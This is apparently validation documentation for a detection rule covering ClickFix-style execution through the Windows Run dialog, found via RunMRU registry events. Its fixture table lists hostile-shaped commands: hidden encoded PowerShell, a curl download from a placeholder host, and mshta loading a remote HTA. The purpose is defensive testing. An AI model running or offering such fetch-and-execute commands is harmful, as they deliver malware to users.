# Validation

## Unit test against fixtures

`tests/fixtures/t1204_004_runmru.json` contains five synthetic `DeviceRegistryEvents` records.

| Fixture | `RegistryValueData` | Expected |
|---|---|---|
| `tp_encoded_powershell` | `powershell -w hidden -nop -enc SQBFAFgAIAAoAE4A...` (long base64) | Fire, High (score 130) |
| `tp_curl_deno` | `cmd /c curl -Lo %tmp%\d.zip https://<host>/d.zip && ...` | Fire, High (score 90) |
| `tp_mshta_remote` | `mshta https://<host>/v.hta` | Fire, High (score 90) |
| `fp_admin_gpupdate` | `cmd /c gpupdate /force` | Fire, Low (score 40), cleared by admin-account exclusion |
| `fn_benign_notepad` | `notepad` | No fire |

Run: `python tools/run_tests.py detections/T1204.004_clickfix_runmru_runtime_loader`

## Live validation on a lab host

Windows 11 VM with Defender for Endpoint onboarded. Isolated network. Never a production host.

1. Confirm telemetry first by running query D. If `DeviceRegistryEvents` shows no RunMRU writes
   in the last 7 days across the estate, registry collection is not reaching you and every other
   result in this file is meaningless.
2. Press Win+R on the lab host and enter a benign command shaped like the real thing, so the
   registry write occurs without executing anything hostile:

   ```
   powershell -w hidden -nop -enc VwByAGkAdABlAC0ASABvAHMAdAAgACIAdgBhAGwAaQBkAGEAdABpAG8AbgAiAA==
   ```

   That base64 decodes to `Write-Host "validation"`. It exercises the interpreter, obfuscation
   and length signals with no payload.
3. Confirm the hit within 15 to 30 minutes and check that `RiskScore` reaches 130 and all three
   boolean signals are true.
4. For query B, place a copy of a signed runtime in `%LOCALAPPDATA%` and launch it from
   PowerShell with a trivial script. Confirm the parentage and path conditions match.

## Atomic Red Team

`T1204.004` has no atomic at time of writing. The registry write is trivially reproducible by
hand as above, so this is a documentation gap rather than a validation gap. A candidate atomic
for the RunMRU write is a reasonable first upstream contribution to that project.

## Known limitations

- Only covers execution via the **Run dialog**. ClickFix variants that instruct the user to paste
  into a PowerShell window or a browser console leave no RunMRU artefact and are not covered here.
- RunMRU is a per-user `HKCU` key. Execution under a different user context on the same host
  produces a separate write; correlate on `DeviceId`, not on account.
- Users can clear Run history, which removes the artefact but not the `DeviceRegistryEvents`
  record already shipped.
- Query B will match legitimate developer use of local Node or Python installs in user profile
  directories. It is deliberately not deployed standalone for that reason.
